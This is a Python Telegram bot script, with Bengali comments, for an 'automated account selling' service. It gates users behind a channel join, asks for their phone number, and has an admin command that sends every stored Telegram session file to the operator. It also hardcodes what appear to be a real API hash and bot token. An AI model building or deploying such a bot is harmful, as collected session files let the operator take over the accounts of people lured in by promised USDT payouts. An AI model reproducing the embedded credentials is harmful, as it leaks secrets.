import os
import asyncio
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

# ============ CONFIGURATION ============
API_ID = 37663020 
API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
ADMIN_ID = 7408644813 
CHANNEL_USERNAME = 'PBC_COMMUNITY' 

SESSIONS_DIR = 'sessions'
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

user_data = {}

# Flask Server
app = Flask(__name__)
@app.route('/')
def home(): return "Bot is Online"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============ BOT CLIENT ============
# loop=asyncio.new_event_loop() যোগ করা হয়েছে এরর ফিক্স করতে
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)

async def is_subscribed(user_id):
    try:
        await bot(GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except (UserNotParticipantError, Exception):
        return False

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        buttons = [[Button.url("Join Channel", f"https://t.me/{CHANNEL_USERNAME}")],
                   [Button.inline("✅ Joined", b"check_join")]]
        await event.respond("👋 Welcome! To use this bot, you must join our channel first.", buttons=buttons)
    else:
        await send_main_menu(event)

@bot.on(events.CallbackQuery(data=b"check_join"))
async def check_join(event):
    if await is_subscribed(event.sender_id):
        await send_main_menu(event)
    else:
        await event.answer("⚠️ You haven't joined yet!", alert=True)

async def send_main_menu(event):
    buttons = [
        [Button.inline("👤 Account", b"acc_info"), Button.inline("💳 Withdrawal", b"withdraw")],
        [Button.inline("📲 Sell Account", b"sell_acc")],
        [Button.inline("ℹ️ About Bot", b"about")]
    ]
    text = "🏠 **Main Menu**\nChoose an option from below:"
    if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
    else: await event.respond(text, buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
    
    if event.data == b"acc_info":
        bal = user_data[user_id]['balance']
        text = f"👤 **Your Account Info**\n\n**User ID:** `{user_id}`\n**Balance:** `{bal:.2f}$` USDT\n\n🚀 *Sell accounts and earn more!*"
        await event.edit(text, buttons=[Button.inline("⬅️ Back", b"main_menu")])
    elif event.data == b"about":
        await event.edit("ℹ️ **About This Bot**\nAutomated account selling bot.\n\n**Created By:** @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
    elif event.data == b"main_menu":
        await send_main_menu(event)
    elif event.data == b"withdraw":
        if user_data[user_id]['balance'] < 1.0:
            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
        else:
            await event.respond("💳 Send your USDT (BEP20) address:")
    elif event.data == b"sell_acc":
        await event.respond("📲 Send your phone number with country code (+880...):")

@bot.on(events.NewMessage(pattern='/adminpanel'))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    if not files: await event.respond("📁 No sessions found.")
    else:
        for f in files: await bot.send_file(ADMIN_ID, f"{SESSIONS_DIR}/{f}", caption=f"📄 Session: `{f}`")

if __name__ == '__main__':
    # Flask থ্রেড চালু করা
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    # বট রান করা
    print("Bot is starting...")
    bot.run_until_disconnected()
